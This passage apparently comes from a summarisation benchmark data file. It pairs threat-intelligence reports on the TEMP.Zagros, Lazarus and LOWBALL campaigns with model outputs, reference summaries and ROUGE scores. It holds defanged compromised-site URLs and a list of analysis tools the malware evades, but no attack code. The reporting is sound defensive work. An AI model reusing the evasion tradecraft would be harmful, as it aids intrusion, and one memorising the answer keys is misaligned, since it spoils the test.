servermon / [ORG] db_template.phphxxp://alwake3press[.]com / wp - includes / db_template.phphxxp://www.hfhl[.]org.ls / habitat / db_template.phphxxp://alcafricanos[.]com / slsmonographs / db_template.phphxxps://agapeencounter[.]org//db_template.phphxxp://apobiomedix[.]ca//db_template.phphxxp://anythinglah[.]info//db_template.phphxxp://aniroleplay[.]net//db_template.phpPDFmyURL converts any url to pdf!hxxp://aniroleplay[.]net//db_template.phphxxp://www.allcopytoners[.]com//db_template.phphxxp://alphaobring[.]com//db_template.phphxxp://www.galwayprimary[.]co.za//db_template.phphxxp://alnuzha[.]org / en / db_template.phphxxps://ancient - wisdoms[.]com//db_template.phphxxp://amazingenergysavings[.]net//db_template.phphxxp://gvs[.]com[.]pk / font - awesome / db_template.phphxxp://geetransfers[.]co.za / font - awesome / db_template.phphxxp://carlagrobler[.]co.za / components / db_template.phphxxp://amazingashwini[.]com//db_template.phphxxp://aminearserver[.]es//db_template.phphxxp://lensofafrica[.]co.za//db_template.phphxxp://greenacrestf[.]co.za / video / db_template.phphxxp://www.tonaro[.]co.za//db_template.phphxxp://alephit2[.]biz / kitzz / db_template.phphxxp://lppaportal[.]org.ls//db_template.phphxxp://alkousy[.]com//db_template.phphxxp://ambulatorioveterinariocalusco[.]com / img / common / db_template.phphxxp://fragranceoil[.]co.za//db_template.phphxxp://www.eloquent[.]co.za / nweb2 / db_template.phpPDFmyURL converts any url to pdf!hxxp://chrishanicdc[.]org / wpimages / db_template.phphxxp://ahc.me[.]uk//db_template.phphxxp://www.britishasia - equip[.]co[.]uk//db_template.phphxxp://always - beauty[.]ch//db_template.phphxxps://www.ancamamara[.]com / wp - admin / db_template.phphxxp://entracorntrading[.]co.za//db_template.phphxxp://www.alexjeffersonconsulting[.]com / wp - includes / db_template.phphxxp://americabr[.]com.br//db_template.phphxxp://andrew - snyder[.]net / bootstrap / db_template.phphxxp://signsoftime[.]co.za//db_template.phphxxp://aperta - armis[.]org//db_template.phphxxp://absfinancialplanning[.]co.za / images / db_template.phphxxp://charispaarl[.]co.za//db_template.phphxxp://indlovusecurity[.]co.za//db_template.phphxxp://alcafricandatalab[.]com//db_template.phphxxp://amor - clubhotels[.]com//db_template.phphxxp://mokorotlocorporate[.]com//db_template.phphxxp://apppriori[.]com//db_template.phphxxp://luxconprojects[.]co.za//db_template.phphxxp://androidphonetips[.]com / wp - includes / db_template.phpPDFmyURL converts any url to pdf!hxxp://angel - seeds[.]com.ua / catalog / db_template.phphxxp://angel - seeds[.]com.ua / catalog / db_template.phphxxp://alissanicolai[.]com / assets / db_template.phphxxps://www.amateurastronomy[.]org//db_template.phphxxp://aiofotoevideo[.]com//db_template.phphxxp://www.amika.hr//db_template.phphxxp://comfortex[.]co.za / php / db_template.phphxxp://deepgraphics[.]co.za//db_template.phphxxps://agiledepot[.]com//db_template.phphxxp://almatours[.]gr//db_template.phphxxp://analystcnwang[.]com//db_template.phphxxp://www.malboer[.]co.za / trendy1 / db_template.phphxxp://sefikengfarm.co.ls//db_template.phphxxp://www.antirughenaturale[.]com / wp - admin / db_template.phphxxp://passright[.]co.za//db_template.phphxxp://seismicfactory[.]co.za//db_template.phphxxp://alessandroalessandrini[.]it//db_template.phphxxps://aquabsafe[.]com//db_template.phphxxp://amatikulutours[.]com / tmp / db_template.phphxxp://ganitis[.]gr//db_template.phphxxp://aleenasgiftbox[.]com / admin / db_template.phphxxps://allusdoctors[.]com / themes / db_template.phpPDFmyURL converts any url to [ORG] pdf!hxxp://alainsaffel[.]com//db_template.phphxxp://www.ariehandomri[.]com//db_template.phphxxp://aquaneeka[.]co[.]uk / wp - includes / db_template.phphxxp://itengineering[.]co.za / gatewaydiamond / db_template.phphxxp://alldomains - crm[.]com / bubblegumpopcorn[.]com / wp - admin / db_template.phphxxp://www.albertamechanical[.]ca//db_template.phphxxp://alchamel[.]info//db_template.phphxxps://almokan[.]net / wp - includes / db_template.phphxxp://jakobieducation[.]co.za//db_template.phphxxps://arc - sec[.]net//db_template.phphxxp://ldams[.]org.ls / supplies / db_template.phphxxp://menaboracks[.]co.za / tmp / db_template.phphxxp://www.getcord[.]co.za//db_template.phphxxp://boardaffairs[.]com//db_template.phphxxp://capetownway[.]co.za//db_template.phphxxp://cloudhostdesign[.]com//db_template.phphxxp://hartenboswaterpark[.]co.za / templates / db_template.phphxxp://fccorp[.]co.za / php / db_template.phphxxp://angar68[.]com//db_template.phphxxp://www.dws - gov[.]co.za//db_template.phpPDFmyURL converts any url to pdf!hxxp://alwahahweb[.]com//db_template.phphxxp://alwahahweb[.]com//db_template.phphxxp://anuragcreatives[.]com//db_template.phphxxp://embali[.]co.za//db_template.phphxxp://albertaedmonton[.]com / widgetstyles / db_template.phphxxp://altosdefontana[.]com//db_template.phphxxp://airfanhydro[.]net//db_template.phphxxps://www.alexponcet[.]com / wp - includes / db_template.phphxxp://agropecuariavilarica[.]com.br//db_template.phphxxps://www.amazingbuyrd[.]com / admin / db_template.phphxxp://cdxtrading[.]co.za//db_template.phphxxp://interafricaconsulting[.]com / wpimages / db_template.phphxxp://glgroup[.]co.za / images / db_template.phphxxp://hisandherskennels[.]co.za / php / db_template.phphxxp://alemaohost[.]com / lotosorg[.]com / db_template.phphxxp://isibaniedu[.]co.za / admin / db_template.phphxxp://dianakleyn[.]co.za / layouts / db_template.phphxxp://themotoringcalendar[.]co.za//db_template.phphxxp://www.loansonhomes[.]co.za//db_template.phphxxp://edgesecurity[.]co.za / js / db_template.phphxxp://highschoolsuperstar[.]co.za / files / db_template.phphxxp://www.ambientproperty[.]com//db_template.phpPDFmyURL converts any url to pdf!hxxp://animationshowreel[.]co.il//db_template.phphxxp://cafawelding[.]co.za / font - awesome / db_template.phphxxp://apalawyers.pt//db_template.phphxxp://www.edesignz[.]co.za//db_template.phphxxp://centuryacademy[.]co.za / css / db_template.phphxxps://ambyenta.hr//db_template.phphxxp://ceramica[.]co.za//db_template.phphxxp://www.alfredoposada[.]com//db_template.phphxxp://anastasovsworkshop[.]com / wp - includes / db_template.phphxxp://allisonplumbing[.]com / wp - includes / db_template.phphxxp://eastrandmotorlab[.]co.za / fleet / db_template.phphxxp://angelsongroup[.]com / wp - includes / db_template.phphxxp://www.mikimaths[.]com//db_template.phphxxp://hjb - racing[.]co.za / htdocs / db_template.phphxxp://anotherpartofme[.]com / wp - includes / db_template.phphxxp://www.andreabelfi[.]com//db_template.phphxxp://www.iancullen[.]co.za//db_template.phphxxp://alaskamaterials[.]com//db_template.phphxxp://jeanetteproperties[.]co.za//db_template.phphxxp://www.digitalmedia[.]co.za//db_template.phpPDFmyURL converts any url to pdf!hxxp://www.rejoicetheatre[.]com//db_template.phphxxp://www.rejoicetheatre[.]com//db_template.phphxxps://alterwebhost[.]com//db_template.phphxxp://bc - u[.]co[.]uk//db_template.phphxxp://dpscdgkhan.edu[.]pk / shopping / db_template.phphxxp://edgeforensic[.]co.za//db_template.phphxxp://willpowerpos[.]co.za//db_template.phphxxp://antrismode[.]com / wp - includes / db_template.phphxxp://colenesphotography[.]co.za / modules / db_template.phphxxp://anthaigroup.vn//db_template.phphxxps://alphainvestors[.]com.au//db_template.phphxxps://aliart[.]nl//db_template.phphxxps://allmantravel[.]com / thumbs / db_template.phphxxp://fbrvolume[.]co.za//db_template.phphxxp://amordegato[.]es / storefront / db_template.phphxxp://agylub[.]com//db_template.phphxxp://www.khotsonglodge.co.ls//db_template.phphxxp://ampli5yd[.]com//db_template.phphxxps://animeok[.]co.il//db_template.phphxxps://arbeidsrechtcentrum[.]nl//db_template.phphxxp://erniecommunications[.]co.za / js / db_template.phphxxp://promechtransport[.]co.za / scripts / db_template.phpPDFmyURL converts any url to pdf!hxxp://centuriongsd[.]co.za//db_template.phphxxp://www.agencesylvieleclerc[.]com//db_template.phphxxp://delcom[.]co.za//db_template.phphxxps://aleoestudio[.]com / gallonature / db_template.phphxxp://oftheearthphotography[.]com / www / db_template.phphxxp://h - dubepromotions[.]co.za//db_template.phphxxp://www.alessioborzuola[.]com / downloads / db_template.phphxxp://crystaltidings[.]co.za//db_template.phphxxp://funeralbusinesssolution[.]com / email_template / db_template.phphxxp://funisalodge[.]co.za / data1 / db_template.phphxxp://experttutors[.]co.za//db_template.phphxxps://www[.]cartridgecave[.]co.za//db_template.phphxxp://ecs - consult[.]com//db_template.phphxxp://www.animationinisrael[.]org / tmp_images / db_template.phphxxp://gideonitesprojects[.]com//db_template.phphxxp://hybridauto[.]co.za / photography / db_template.phphxxp://africanpixels.zar.cc//db_template.phphxxp://ryanchristiefurniture[.]co.za//db_template.phphxxp://evansmokaba[.]com / evansmokaba[.]com / thabiso / db_template.phphxxp://almeriahotelja[.]com / dk / db_template.phpPDFmyURL converts any url to pdf!hxxp://al3abflash[.]biz//db_template.phphxxp://al3abflash[.]biz//db_template.phphxxp://www.fun4kidz[.]co.za//db_template.phphxxp://alsharhanstore[.]com//db_template.phphxxp://www[.]infratechconsulting[.]com//db_template.phphxxp://algihad[.]com / assets / db_template.phphxxp://americanwestmedia[.]com//db_template.phphxxp://charliewestsecurity[.]co.za//db_template.phphxxp://beehiveholdingszar[.]co.za//db_template.phphxxp://analyticalfootball[.]com//db_template.phphxxp://apiiination[.]com / leadership / db_template.phphxxps://ahelicoptermom[.]com / wp - includes / db_template.phphxxp://servicebox[.]co.za//db_template.phphxxp://globalelectricalandconstruction[.]co.za / wpscripts / db_template.phphxxps://aquo[.]in//db_template.phphxxps://www.alfransia[.]com / wp - admin / db_template.phphxxp://www.icsswaziland[.]com//db_template.phphxxp://aiko.pro//db_template.phphxxps://alceharfield[.]com//db_template.phphxxp://indocraft[.]co.za / test / db_template.phphxxp://allegiancesecurity[.]org//db_template.phphxxp://sullivanprimary[.]co.za//db_template.phpPDFmyURL converts any url to [NORP] pdf!hxxp://www.apmequestrian[.]com//db_template.phphxxps://alphawaves[.]org / wp - admin / db_template.phphxxp://www.alexandrasternin[.]com / illustration / db_template.phphxxp://www.daleth[.]co.za//db_template.phphxxp://jwseshowe[.]co.za / assets / db_template.phphxxp://winagainstebola[.]com//db_template.phphxxp://anubandh[.]in//db_template.phphxxp://www.alexanderhomestead[.]com//db_template.phphxxp://alfatek - intelligence[.]com//db_template.phphxxp://www.aprendiendoencasa[.]com / wp - includes / db_template.phphxxp://alorabrownies[.]com / wp - admin / db_template.phphxxp://andrasadam[.]com / tothildiko / wp - includes / db_template.phphxxp://cazochem[.]co.za / cazochem / db_template.phphxxp://debnoch[.]com / image / db_template.phphxxp://hmholdings360[.]co.za//db_template.phphxxp://iinvest4u[.]co.za//db_template.phphxxp://burgercoetzeeattorneys[.]co.za//db_template.phphxxp://anngrigphoto[.]com//db_template.phphxxp://alchemistasonida[.]com//db_template.phphxxp://anahera[.]biz / admin / db_template.phpPDFmyURL converts any url to pdf!hxxp://h - u - i[.]co.za / heiren / db_template.phphxxp://h - u - i[.]co.za / heiren / db_template.phphxxp://insta - art[.]co.za//db_template.phphxxp://muallematsela[.]com//db_template.phphxxp://aguasdecastilla[.]com / uploads / db_template.phphxxp://www.arabgamenetwork[.]com//db_template.phphxxps://arhiepiscopiabucurestilor[.]ro / templates / db_template.phphxxp://amruthavana[.]com / blog / db_template.phphxxp://digitalblue[.]co.za//db_template.phphxxps://www.alvarezarquitectos[.]com//db_template.phphxxp://buboobioinnovations[.]co.za / wpimages / db_template.phphxxp://andrewsbisom[.]com//db_template.phphxxp://www.m-3[.]co.za//db_template.phphxxp://beesrenovations[.]co.za / images / db_template.phphxxps://www.apliety[.]co.il / wp - includes / db_template.phphxxp://alchamelup[.]org / htdocs / db_template.phphxxp://benonicoc[.]co.za / resources / db_template.phphxxps://al - mostakbl[.]com//db_template.phphxxp://alchimiegrafiche[.]net / bbdelteatro / db_template.phphxxp://andrespazsoldan[.]com//db_template.phphxxp://in2accounting[.]co.za//db_template.phphxxp://aipa[.]ca//db_template.phpPDFmyURL converts any url to pdf!hxxp://alphabee.fund / PHPMailer_5.2.0 / db_template.phphxxp://arabsdeals[.]com//db_template.phphxxps://archiotronic[.]com / wp - includes / db_template.phphxxp://capewindstrading[.]co.za//db_template.phphxxps://althurayaa[.]com//db_template.phphxxp://jhphotoedits[.]co.za//db_template.phphxxp://cloudhub.co.ls / modules / db_template.phphxxp://apironco[.]com / wp - includes / db_template.phphxxp://digital - cameras - south - africa[.]co.za / script / db_template.phphxxp://ahmadhasanat[.]com//db_template.phphxxp://alexrocchi[.]com//db_template.phphxxp://aljaadi[.]com//db_template.phphxxps://www.engeltjieakademie[.]co.za//db_template.phphxxp://annabelle[.]nl / next / db_template.phphxxp://juniorad[.]co.za / vendor / db_template.phphxxp://animationpulse[.]net//db_template.phphxxp://angloglot[.]com//db_template.phphxxp://agricolavicuna.cl//db_template.phphxxp://alexelgy[.]com / allaccess / db_template.phphxxp://www.centreforgovernance[.]uk//db_template.phpPDFmyURL converts any url to [ORG] pdf!hxxp://www.aliandconsulting[.]com//db_template.phphxxp://balaateen[.]co.za / less / db_template.phphxxp://aleksicdunja[.]com//db_template.phphxxp://arestihome[.]com//db_template.phphxxp://am1int.fcomet[.]com / wp1 / db_template.phphxxp://anet - international - group[.]com / shop / db_template.phphxxp://courtesydriving[.]co.za / js / db_template.phphxxp://annaplebanek[.]com//db_template.phphxxp://agencijazemil[.]com//db_template.phphxxp://airminumtiro[.]com//db_template.phphxxp://www.androidwikihow[.]com//db_template.phphxxp://alisabyfinna[.]com//db_template.phphxxp://rma - law[.]co.za//db_template.phphxxp://amari[.]ro / components / db_template.phphxxp://anxiousandunstoppable[.]com//db_template.phphxxp://www.buhlebayoacademy[.]com//db_template.phphxxp://arabellajo[.]com / wp / wp - includes / db_template.phphxxp://blackthorn[.]co.za//db_template.phphxxp://alaqaba[.]com / dnsarabia[.]com / db_template.phphxxp://airesis.blog / wp - admin / db_template.phphxxp://www.aptibet[.]org//db_template.phpPDFmyURL converts any url to pdf!hxxp://alecattic[.]com / wp - includes / db_template.phphxxp://anglero[.]com//db_template.phphxxp://getabletravel[.]co.za / wpscripts / db_template.phphxxp://www.allwestdental[.]com / wp - includes / db_template.phphxxp://printernet[.]co.za//db_template.phphxxp://genesisbs[.]co.za//db_template.phphxxp://allsporthealthandfitness[.]com//db_template.phphxxp://www.humorcarbons[.]com//db_template.phphxxp://intelligentprotection[.]co.za//db_template.phphxxp://amazethings[.]com//db_template.phphxxp://incoso[.]co.za / images / db_template.phphxxp://www.antoanetapalikarska[.]com//db_template.phphxxps://www.alteaparadise[.]com / wp - includes / db_template.phphxxp://amirmenahem[.]com//db_template.phphxxp://isound[.]co.za//db_template.phphxxp://www.alestilorachel[.]com//db_template.phphxxp://alcfm[.]net / wp - admin / db_template.phphxxp://www.acer - parts[.]co.za//db_template.phphxxp://www.gsmmid[.]com//db_template.phphxxp://skhaleni[.]co.za//db_template.phpPDFmyURL converts any url to [NORP] pdf!hxxps://amiici.vision//db_template.phphxxps://andihaas[.]at / wp - includes / [PERSON] db_template.phphxxp://www.albertaprimebeef[.]com//db_template.phphxxps://www.appster[.]it / wp - includes / db_template.phphxxp://amofoundation[.]org / wp - includes / db_template.phphxxp://iqra[.]co.za / pub / db_template.phphxxp://thecompasssolutions[.]co.za//db_template.phphxxp://archwaycarpetscrm[.]co[.]uk//db_template.phphxxp://iggleconsulting[.]com//db_template.phphxxps://angel - blanco[.]net / wp - includes / db_template.phphxxps://anotherdayinparadise[.]ca//db_template.phphxxp://www.bitp[.]co.za//db_template.phphxxp://cupboardcure[.]co.za / vendor / db_template.phphxxp://all2wedding[.]com / wp - includes / db_template.phphxxp://allianz[.]com.pe / wp - admin / db_template.phphxxp://amiehepperlin[.]com//db_template.phphxxps://www.amighini[.]it / webservice / db_template.phphxxp://broken - arrow[.]co.za//db_template.phphxxp://www.ihlosiqs - pm[.]co.za//db_template.phphxxp://alisimple[.]si / wp - includes / db_template.phphxxp://allthat[.]social//db_template.phpPDFmyURL converts any url to [ORG] pdf!hxxp://allthat[.]social//db_template.phphxxp://www.amphibiblechurch[.]com//db_template.phphxxp://bestencouragementwords[.]com//db_template.phphxxp://alayhamtechnologies[.]com//db_template.phphxxps://alaskanharvestseafood[.]com / backup / db_template.phphxxps://www.air - mag[.]ro//db_template.phphxxp://get - paid - for - online - survey[.]com//db_template.phphxxp://www.antc[.]ch / wp - includes / db_template.phphxxp://firstchoiceproperties[.]co.za//db_template.phphxxp://habibtextiles[.]pk//db_template.phphxxp://fsproperties[.]co.za / engine1 / db_template.phphxxp://diegemmerkat[.]co.za//db_template.phphxxp://molepetravel.co.ls//db_template.phphxxp://mmetl[.]co.za//db_template.phphxxp://altrablog[.]com//db_template.phphxxp://abrahamseed[.]co.za//db_template.phphxxp://www.amerindgen[.]com / author / admin1 / db_template.phphxxp://altcoinaddict[.]com//db_template.phphxxp://iiee.edu[.]pk//db_template.phphxxp://cmhts[.]co.za / resources / db_template.phphxxp://domesticguardians[.]co.za / Banner / db_template.phpPDFmyURL converts any url to pdf!hxxps://amishcountryfurnishings[.]com//db_template.phphxxps://allday[.]gr//db_template.phphxxp://www.alinn - u - yin[.]com//db_template.phphxxps://www.allin - chain[.]com//db_template.phphxxps://www.anatapackaging[.]com / vendors / db_template.phphxxp://alexcelts[.]com / wp / db_template.phphxxp://www.allstylus[.]com.br//db_template.phphxxp://www.algom - law[.]com//db_template.phphxxp://ambiances - toiles[.]fr//db_template.phpAppendixSecurity Tools Checked on the Machinewin32_remotewin64_remote64ollydbgProcessHackertcpviewautorunsautorunscfilemonprocmonPDFmyURL converts any url to pdf!regmonregmonprocexpidaqidaq64ImmunityDebuggerWiresharkdumpcapHookExplorerImportRECPEToolsLordPEdumpcapSysInspectorproc_analyzersysAnalyzersniff_hitwindbgjoeboxcontroljoeboxserverThis entry was posted on Tue [TIME] Mar [TIME] 13 [TIME] 12:15 [TIME] EDT [DATE] 2018 and filed under [PERSON] Yogesh [PERSON] Londhe , [PERSON] Dileep [PERSON] Kumar [PERSON] Jallepalli , [PERSON] Ben [PERSON] Read , [GPE] Iran , Spear Phishing , and [PERSON] Sudeep [PERSON] Singh . PDFmyURL converts any url to pdf!Sign up for email updates Get information and insight on [DATE] today 's advanced threats from the leader in advanced threat prevention . First NameLast [ORG] NameEmail [ORG] AddressCompany [ORG] NameThreat [ORG] Research [ORG] BlogProducts and [ORG] Services BlogSUBSCRIBEPDFmyURL converts any url to pdf!Company Supplier DocumentsNew s and [PRODUCT] Events [PRODUCT] New s and Events Awards and Honors Email PreferencesTechnical Support Report Security Issue Documentation PortalFireEye Blogs Products and Services Executive PerspectivesThreat Map Threat Map View the Latest ThreatsContact Us Contact Us +1 877 - 347 - 3393 \ue905Copyright \u00a9 2018 [ORG] FireEye , Inc. All rights reserved . [ORG] Privacy [ORG] & [ORG] Cookies [ORG] Policy [ORG] | [ORG] Privacy [ORG] Shield | Legal DocumentationSite Language English \ue886PDFmyURL converts any url to pdf !", "generated_text": "the document; TEMP.Zagros; Iran; at least May 2017; spear phishing; individuals; Asia; the Middle East; the campaign; ATT&CK; lateral movement techniques; the macro; INI; INF; SCT files; the VBS; VBS code execution; the PowerShell; the command; Execute; the backdoor; PowerSTATS; the malware; the Infection Vector; INF; SCT files; the campaign; a new variant; the macro; the VBS script; the infection vector; the macro; VBS code execution; the Infection Vector; the macro; the attacks; the infrastructure; the attackers; the campaign.", "ref_text": "<START-1>The PDF describes cyberattacks by an Iranian threat group called TEMP.Zagros or MuddyWater that targeted organizations in Asia and the Middle East from January to March 2018. The attacks distributed macro-enabled documents purporting to be from Pakistani, Turkish, Indian, and Tajikistani agencies. If the macro is enabled, it drops and executes scripts that install the POWERSTATS backdoor. The macros utilize recent techniques like INF/SCT file abuse and AppLocker bypass for indirect code execution to avoid detection. The backdoor uses RSA encryption for C2 communications and can gather system info, take screenshots, run commands, and more. The macros also achieve persistence by imitating legitimate scheduled tasks. The backdoor code shows anti-analysis measures like sandbox detection and shutdown. It uses a large proxy network for command and control. While the technical sophistication is medium, the continual evolution in tactics, techniques, and procedures shows TEMP.Zagros rapidly incorporates new methods into campaigns. Organizations should block macros, patch exploitation vectors, and use threat intelligence to detect the indicators and infrastructure. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.45294117647058824, "gpt3/lexical/rouge_rouge2": 0.11834319526627218, "gpt3/lexical/rouge_rougeL": 0.2235294117647059, "gpt3/lexical/rouge_rougeLsum": 0.2235294117647059, "gpt3_generated_text": ["In a recent spear phishing campaign, a threat group known as TEMP.Zagros, believed to be associated with Iran, has been observed using advanced tactics, techniques, and procedures (TTPs) to distribute malicious macro-based documents to individuals in Asia and the Middle East. This campaign, which started in January 2018 and continued until March 2018, targeted government and defense entities in Central and Southwest Asia. The threat actor used geopolitical-themed spear phishing emails with attached malicious macro documents to deliver a backdoor malware called POWERSTATS. Notably, the attackers employed the latest AppLocker bypass and lateral movement techniques for indirect code execution. The campaign had two parts, with the second part using a new variant of the macro that leverages INF and SCT files for PowerShell code execution. The infection vector for these attacks involved macro-based documents sent as email attachments, specifically targeting individuals in Turkey, Pakistan, Tajikistan, and India. The article provides further details and examples of the spear phishing emails and malicious documents used in the campaign."]}, {"split_name": "val", "sample_id": "val_81", "prompt_text": "Extract the keywords: ESET research   ESETresearch ESETresearch   BREAKING A signed [PERSON] Mac executable disguised as a job description for [ORG] Coinbase was uploaded to [ORG] VirusTotal from [GPE] Brazil . This is an instance of [ORG] Operation [ORG] In(ter)ception by   Lazarus for Mac.@pkalnai @dbreitenbacher1/74:51 PM \u00b7 [PERSON] Aug 16 , [DATE] 2022 \u00b7   witter Web App140Retweets15Quote   weets281Likes \u00b7 [ORG] ESETresearch [ORG] Aug [CARDINAL] 16ESET research Replying to   ESETresearch Malware is compiled for both [ORG] Intel and [ORG] Apple [ORG] Silicon . It drops [CARDINAL] three files : a decoy [PERSON] PDF document Coinbase_online_careers_2022_07.pdf , a bundle FinderFontsUpdater.app and a downloader safarifontagent . It is similar to   ESETresearch discovery in May. [CARDINAL] 2/7ESET research   ESETresearch \u00b7 [DATE] May [DATE] 4 [DATE] ESETresearch [DATE] A [DATE] year [DATE] ago , a signed Mach - O executable disguised as a job description was uploaded to [ORG] VirusTotal from [GPE] Singapore . [ORG] Malware is compiled for [ORG] Intel and [ORG] Apple [ORG] Silicon and drops a [ORG] PDF decoy . We think it was part of   [ORG] Lazarus campaign for [PERSON] Mac . @pkalnai @marc_etienne _ 1/8 Show this thread1213 \u00b7 ESETresearch Aug [CARDINAL] 16ESET research However , this time the bundle is signed [DATE] July [DATE] 21 ( according to the timestamp ) using a certificate issued in [DATE] February [DATE] 2022 to a developer named [PERSON] Shankey [PERSON] Nohria and team identifier [CARDINAL] 264HFWQH63 . The application is not notarized and [ORG] Apple has revoked the certificate on [DATE] August [DATE] 12 . 3/71112 ESETresearch Aug [CARDINAL] 16ESET research Another change is in the downloader , safarifontagent , as it connects to a different [ORG] C&C server ( url The C&C\u00b7server did not respond at the time we analyzed this threat . [CARDINAL] 4/71310 ESETresearch Aug [CARDINAL] 16ESET research The [NORP] Windows counterpart of this threat dropping the exact same decoy ( [CARDINAL] 2B4E8F1927927BDC2F71914BA1F12511D9B6BDBDB2DF390E267F54DC 4F8919DD ) was spotted [DATE] August [DATE] 4 by\u00b7@h2jazi . [CARDINAL] 5/7 \u00b7 [PERSON] Aug 4Jazi @h2jazi The decoy pdf is \" Engineering Manager , Product Security \" job description at [ORG] Coinbase . Next stage : ( gone ! ) url twitter.com/h2jazi/status/\u20261210ESET research [ORG] ESETresearch [ORG] Aug 16\u00b7IoCs : [CARDINAL] 6/71510 [CARDINAL] ESETresearch Aug [CARDINAL] 16ESET research url [ORG] OSX / [PRODUCT] NukeSped . N   ESETresearch 7/7\u00b728@pwnsdx Aug 17\u00b7Sabri Replying to That 's problematic [ORG] ESETresearch [ORG] @pkalnai@deeffcaf Aug 17 ESETresearch @pkalnai\u00b7deeffcaf Replying to Got iT.@plaero3 Aug [CARDINAL] 18\u00b7plaero Replying to @threadreaderapp [DATE] ESETresearch @pkalnaiunroll pleaseand@dbreitenbacherand@dbreitenbacherand@dbreitenbacher1Thread [PERSON] Reader [PERSON] App@threadreaderapp [PERSON] Aug [CARDINAL] 18 \u00b7", "generated_text": "Operation In(ter)ception; Lazarus; Mac; malware; Intel; Apple Silicon; a PDF; the decoy PDF; a bundle; Safarifontagent; the downloader; a certificate; February 2022; a developer; Shankey Nohria; 264HFWQH63; the job; the decoy; the Mac; the PDF; The C&C server; the malware; the C&C server; The C&C server; July 21; a certificate; the C&C server; the PDF; The decoy; the downloader; SafariFontsUpdater.app; the C&C server; the C&C server; the decoy; the Linux; the C&C server; the C&C; the server; Lazarus.", "ref_text": "<START-1>ESET researchers discovered a new malware campaign targeting Mac users that is attributed to the Lazarus threat group. On August 16, 2022, ESET announced on Twitter that a signed Mac executable disguised as a Coinbase job description was uploaded to VirusTotal from Brazil. This is similar to a campaign ESET uncovered in May 2022 originating from Singapore. The malware is compiled for both Intel and Apple Silicon architectures. It drops three files: a PDF job description decoy, a bundle called FinderFontsUpdater.app, and a downloader called safarifontagent. The bundle is signed with a certificate issued in February 2022 that Apple revoked on August 12, 2022. Unlike the May campaign, this version connects to a different command and control server at concrecapital[.]com. The server did not respond when analyzed. On August 4, 2022, another security researcher found a Windows version dropping the same PDF and connecting to a different C2. ESET believes this new activity is part of Lazarus' Operation In(ter)ception campaign targeting Mac users. The malware bypasses security products by disguising itself as a legitimate job application. The use of code signing and targeting of cryptocurrency companies indicates the likely purpose is cyberespionage and financial theft. ESET provided hashes for the dropped files and C2 domain to help identify infections. They assess this demonstrates Lazarus' continued efforts to breach MacOS devices through social engineering and Trojanized applications. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4092409240924092, "gpt3/lexical/rouge_rouge2": 0.25913621262458475, "gpt3/lexical/rouge_rougeL": 0.30363036303630364, "gpt3/lexical/rouge_rougeLsum": 0.30363036303630364, "gpt3_generated_text": ["The article discusses a recent instance of Operation In(ter)ception by the Lazarus group targeting Mac users. A signed Mac executable disguised as a job description for Coinbase was uploaded to VirusTotal from Brazil. The malware, compiled for both Intel and Apple Silicon, drops three files: a decoy PDF document, a bundle called FinderFontsUpdater.app, and a downloader named safarifontagent. This attack is similar to a previous discovery by ESETresearch in May. "]}, {"split_name": "val", "sample_id": "val_82", "prompt_text": "Extract the keywords: [ORG] Menu   [ORG] Home [ORG] FireEye BlogsThreat Research   [GPE] China - based [ORG] Cyber [ORG] Threat [ORG] Group Uses Dropbox for Ma    ShareDecember 01 , 2015 | By [ORG] FireEye [ORG] Threat [ORG] Intelligence [ORG] | [ORG] Threat [ORG] Intelligence , Threat ResearchFireEye Threat Intelligence analysts identified a spear phishing campaign carried out in [DATE] August [DATE] 2015 targeting [GPE] Hong [GPE] Kong - based media organizations . A [GPE] China - based cyber threat group , which [ORG] FireEye tracks as an uncategorized advanced persistent threat ( [ORG] APT ) group and other researchers refer to as \u201c admin@338 , \u201d may have conduced the activity.[1 ] The email messages contained malicious documents with a malware payload called [PERSON] LOWBALL . LOWBALL abuses the [ORG] Dropbox cloud storage service for command and control ( [WORK_OF_ART] CnC ) . We collaborated with [ORG] Dropbox to investigate the threat , and our cooperation revealed what may be a [ORDINAL] second , similar operation . The attack is part of a trend where threat groups hide malicious activity by communicating with legitimate web services such as social networking and cloud storage sites to foil detection efforts.[2][3]The threat group has previously used newsworthy events as lures to deliver malware . [ 4 ] They have largely targeted organizations involved in financial , economic and trade policy , typically using publicly available RATs such as [ORG] Poison Ivy , as well some non - public backdoors.[5]The group started targeting [GPE] Hong [GPE] Kong media companies , probably in response to political and economic challenges in [GPE] Hong [GPE] Kong and [GPE] China . The threat group \u2019s latest activity coincided with the announcement of criminal charges against democracy activists.[6 ] During [DATE] the [DATE] past [DATE] 12 [DATE] months , [NORP] Chinese authorities have faced several challenges , including large - scale protests in [GPE] Hong [GPE] Kong in [DATE] late [DATE] 2014 , the precipitous decline in the stock market in [DATE] mid-2015 , and the massive industrial explosion in [GPE] Tianjin in [DATE] August [DATE] 2015 . In [GPE] Hong [GPE] Kong , the pro - democracy movement persists , and the government recently denied a professor a post because of his links to a pro - democracy leader.[7]Multiple [GPE] China - based cyber threat groups have targeted international media organizations in the past . The targeting has often focused on [GPE] Hong [GPE] Kong - based media , particularly those that publish pro - democracy material . The media organizations targeted with the threat group \u2019s well - crafted [NORP] Chinese language lure documents are precisely those whose networks [GPE] Beijing would seek to monitor . Cyber threat groups \u2019 access to the media organization \u2019s networks could potentially provide the government advance warning on upcoming protests , information on pro - democracy group leaders , and insights needed to disrupt activity on the Internet , such as what occurred in [DATE] mid-2014 when several websites were brought down in denial of service [DATE] attacks.[8]In [DATE] August [DATE] 2015 , the threat actors sent spear phishing emails to a number of [GPE] Hong [GPE] Kong - based media organizations , including newspapers , radio , and television . The [ORDINAL] first email references the creation of a [NORP] Christian civil society organization to coincide with the anniversary of the [DATE] 2014 protests in [GPE] Hong [GPE] Kong known as [ORG] the [ORG] Umbrella [ORG] Movement . The [ORDINAL] second email references a [ORG] Hong [ORG] Kong [ORG] University alumni organization that fears votes in a referendum to appoint a Vice - Chancellor will be co - opted by pro - [PERSON] Beijing interests.[9]Figure [CARDINAL] 1 : Lure [PERSON] ScreenshotsThe group \u2019s previous activities against financial and policy organizations have largely focused on spear phishing emails written in [LANGUAGE] English , destined for Western audiences . This campaign , however , is clearly designed for those who read the traditional [NORP] Chinese script commonly used in [GPE] Hong [GPE] Kong . The spear phishing emails contained [CARDINAL] three attachments in total , each of which exploited an older vulnerability ability to download , upload , and execute files . The communication occurs via [ORG] HTTPS over port [CARDINAL] 443.After execution , the malware will use the Dropbox API to make an HTTP 